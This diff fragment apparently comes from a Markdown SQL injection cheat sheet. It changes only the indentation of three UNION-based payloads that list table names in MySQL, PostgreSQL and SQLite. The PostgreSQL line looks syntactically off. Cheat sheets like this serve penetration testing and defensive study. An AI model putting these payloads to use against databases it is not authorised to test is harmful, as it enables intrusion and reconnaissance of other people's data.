@@ -106,16 +106,16 @@
 - Retreive tables
 
 1.  Mysql
-    
-    union select group_concat(table_name) from information_schema.tables 
+
+       union  select group_concat(table_name) from information_schema.tables 
 		
 3. PostgreSQL
 
-     UNION SELECT * FROM string_agg(tablename, ',') WHERE schemaname != 'pg_catalog'  AND schemaname != 'information_schema';
+       UNION SELECT * FROM string_agg(tablename, ',') WHERE schemaname != 'pg_catalog'  AND schemaname != 'information_schema';
 
 3. SQLite
 
-     union select group_concat(name) from sqlite_master WHERE type='table'
+       union select group_concat(name) from sqlite_master WHERE type='table'
 
 - SQL Truncation
 
